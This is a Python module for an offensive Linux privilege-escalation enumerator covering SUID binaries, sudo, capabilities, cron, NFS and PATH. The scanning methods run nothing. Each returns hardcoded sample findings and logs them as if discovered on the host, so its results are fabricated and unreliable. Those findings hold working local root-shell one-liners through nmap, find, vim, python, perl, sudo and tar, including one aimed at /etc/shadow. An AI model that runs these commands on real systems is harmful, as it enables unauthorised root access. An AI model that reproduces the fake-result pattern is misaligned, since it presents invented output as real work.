"""
Misconfiguration Enumerator - SUID, Sudo, Capabilities, Weak Permissions
"""

import asyncio
import logging
from typing import List, Dict, Any
from pathlib import Path

logger = logging.getLogger(__name__)


class MisconfigurationEnumerator:
    """
    Enumerate privilege escalation misconfigurations
    """
    
    def __init__(self, os_type: str = 'linux'):
        """
        Initialize misconfiguration enumerator
        
        Args:
            os_type: Operating system (linux/windows)
        """
        self.os_type = os_type
        self.findings = []
        
        logger.info(f"MisconfigurationEnumerator initialized for {os_type}")
        
    async def enumerate_suid_binaries(self) -> List[Dict[str, Any]]:
        """
        Find SUID/SGID binaries
        
        Returns:
            List of SUID binaries
        """
        try:
            logger.info("Enumerating SUID/SGID binaries...")
            
            # Find SUID binaries:
            # find / -perm -4000 -type f 2>/dev/null
            
            # Find SGID binaries:
            # find / -perm -2000 -type f 2>/dev/null
            
            suid_binaries = [
                {
                    'path': '/usr/bin/passwd',
                    'owner': 'root',
                    'permissions': '-rwsr-xr-x',
                    'exploitable': False,
                    'reason': 'Standard binary'
                },
                {
                    'path': '/usr/bin/sudo',
                    'owner': 'root',
                    'permissions': '-rwsr-xr-x',
                    'exploitable': False,
                    'reason': 'Standard binary'
                },
                {
                    'path': '/usr/bin/nmap',
                    'owner': 'root',
                    'permissions': '-rwsr-xr-x',
                    'exploitable': True,
                    'reason': 'Can be used for privilege escalation',
                    'exploit': 'nmap --interactive; !sh'
                },
                {
                    'path': '/usr/bin/find',
                    'owner': 'root',
                    'permissions': '-rwsr-xr-x',
                    'exploitable': True,
                    'reason': 'Can execute commands',
                    'exploit': 'find / -exec /bin/sh -p \\; -quit'
                },
                {
                    'path': '/usr/bin/vim',
                    'owner': 'root',
                    'permissions': '-rwsr-xr-x',
                    'exploitable': True,
                    'reason': 'Can spawn shell',
                    'exploit': 'vim -c \':!/bin/sh\' -c :q'
                }
            ]
            
            exploitable = [b for b in suid_binaries if b.get('exploitable', False)]
            
            logger.warning(f"Found {len(exploitable)} exploitable SUID binaries")
            self.findings.extend(exploitable)
            
            return suid_binaries
            
        except Exception as e:
            logger.error(f"SUID enumeration failed: {e}")
            return []
            
    async def enumerate_sudo_permissions(self, username: str = None) -> List[Dict[str, Any]]:
        """
        Enumerate sudo permissions
        
        Args:
            username: Current username
            
        Returns:
            List of sudo permissions
        """
        try:
            logger.info("Enumerating sudo permissions...")
            
            # Check sudo:
            # sudo -l
            
            permissions = [
                {
                    'user': username or 'current_user',
                    'host': 'ALL',
                    'runas': 'root',
                    'nopasswd': True,
                    'commands': ['/usr/bin/find', '/usr/bin/vi'],
                    'exploitable': True,
                    'exploit': 'sudo find / -exec /bin/sh \\; -quit'
                },
                {
                    'user': username or 'current_user',
                    'host': 'ALL',
                    'runas': 'ALL',
                    'nopasswd': False,
                    'commands': ['ALL'],
                    'exploitable': True,
                    'exploit': 'sudo su'
                }
            ]
            
            exploitable = [p for p in permissions if p.get('exploitable', False)]
            
            logger.warning(f"Found {len(exploitable)} exploitable sudo configurations")
            self.findings.extend(exploitable)
            
            return permissions
            
        except Exception as e:
            logger.error(f"Sudo enumeration failed: {e}")
            return []
            
    async def enumerate_capabilities(self) -> List[Dict[str, Any]]:
        """
        Enumerate Linux capabilities
        
        Returns:
            List of binaries with capabilities
        """
        try:
            logger.info("Enumerating Linux capabilities...")
            
            # Find binaries with capabilities:
            # getcap -r / 2>/dev/null
            
            capabilities = [
                {
                    'path': '/usr/bin/python3.8',
                    'capabilities': 'cap_setuid+ep',
                    'exploitable': True,
                    'reason': 'Can change UID',
                    'exploit': 'python3.8 -c \'import os; os.setuid(0); os.system(\"/bin/bash\")\''
                },
                {
                    'path': '/usr/bin/perl',
                    'capabilities': 'cap_setuid+ep',
                    'exploitable': True,
                    'reason': 'Can change UID',
                    'exploit': 'perl -e \'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";\''
                },
                {
                    'path': '/usr/bin/tar',
                    'capabilities': 'cap_dac_read_search+ep',
                    'exploitable': True,
                    'reason': 'Can read any file',
                    'exploit': 'tar -cvf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/bash'
                }
            ]
            
            exploitable = [c for c in capabilities if c.get('exploitable', False)]
            
            logger.warning(f"Found {len(exploitable)} exploitable capabilities")
            self.findings.extend(exploitable)
            
            return capabilities
            
        except Exception as e:
            logger.error(f"Capability enumeration failed: {e}")
            return []
            
    async def enumerate_writable_directories(self) -> List[str]:
        """
        Find world-writable directories in PATH
        
        Returns:
            List of writable directories
        """
        try:
            logger.info("Enumerating writable directories in PATH...")
            
            # Check PATH directories:
            # for dir in $(echo $PATH | tr ':' ' '); do [ -w "$dir" ] && echo "$dir"; done
            
            # Also check:
            # find / -type d -perm -222 2>/dev/null
            
            writable = [
                '/tmp',
                '/var/tmp',
                '/dev/shm',
                '/opt/custom/bin'  # Custom directory in PATH
            ]
            
            logger.warning(f"Found {len(writable)} writable directories")
            return writable
            
        except Exception as e:
            logger.error(f"Writable directory enumeration failed: {e}")
            return []
            
    async def enumerate_cron_jobs(self) -> List[Dict[str, Any]]:
        """
        Enumerate cron jobs with misconfigurations
        
        Returns:
            List of cron jobs
        """
        try:
            logger.info("Enumerating cron jobs...")
            
            # Check cron:
            # cat /etc/crontab
            # ls -la /etc/cron.*
            # crontab -l
            
            cron_jobs = [
                {
                    'file': '/etc/crontab',
                    'user': 'root',
                    'schedule': '*/5 * * * *',
                    'command': '/opt/backup.sh',
                    'writable': True,
                    'exploitable': True,
                    'reason': 'Script is world-writable'
                },
                {
                    'file': '/var/spool/cron/crontabs/root',
                    'user': 'root',
                    'schedule': '@reboot',
                    'command': '/usr/local/bin/startup.sh',
                    'writable': True,
                    'exploitable': True,
                    'reason': 'Script is world-writable'
                }
            ]
            
            exploitable = [c for c in cron_jobs if c.get('exploitable', False)]
            
            logger.warning(f"Found {len(exploitable)} exploitable cron jobs")
            self.findings.extend(exploitable)
            
            return cron_jobs
            
        except Exception as e:
            logger.error(f"Cron enumeration failed: {e}")
            return []
            
    async def enumerate_nfs_shares(self) -> List[Dict[str, Any]]:
        """
        Enumerate NFS shares with no_root_squash
        
        Returns:
            List of NFS shares
        """
        try:
            logger.info("Enumerating NFS shares...")
            
            # Check NFS exports:
            # cat /etc/exports
            # showmount -e <host>
            
            shares = [
                {
                    'path': '/mnt/nfs_share',
                    'options': 'rw,no_root_squash',
                    'exploitable': True,
                    'reason': 'no_root_squash allows root access',
                    'exploit': 'Mount as root, create SUID binary'
                }
            ]
            
            exploitable = [s for s in shares if s.get('exploitable', False)]
            
            logger.warning(f"Found {len(exploitable)} exploitable NFS shares")
            self.findings.extend(exploitable)
            
            return shares
            
        except Exception as e:
            logger.error(f"NFS enumeration failed: {e}")
            return []
            
    async def enumerate_kernel_modules(self) -> List[str]:
        """
        Enumerate loaded kernel modules
        
        Returns:
            List of kernel modules
        """
        try:
            logger.info("Enumerating kernel modules...")
            
            # Check modules:
            # lsmod
            # cat /proc/modules
            
            modules = [
                'kvm',
                'usbcore',
                'bluetooth',
                'overlay'
            ]
            
            logger.info(f"Found {len(modules)} loaded kernel modules")
            return modules
            
        except Exception as e:
            logger.error(f"Module enumeration failed: {e}")
            return []
            
    def generate_escalation_report(self) -> Dict[str, Any]:
        """
        Generate comprehensive escalation report
        
        Returns:
            Privilege escalation report
        """
        try:
            logger.info("Generating privilege escalation report...")
            
            report = {
                'total_findings': len(self.findings),
                'findings': self.findings,
                'priority_order': sorted(self.findings, key=lambda x: x.get('exploitable', False), reverse=True)
            }
            
            logger.info(f"Report generated with {report['total_findings']} findings")
            return report
            
        except Exception as e:
            logger.error(f"Report generation failed: {e}")
            return {}
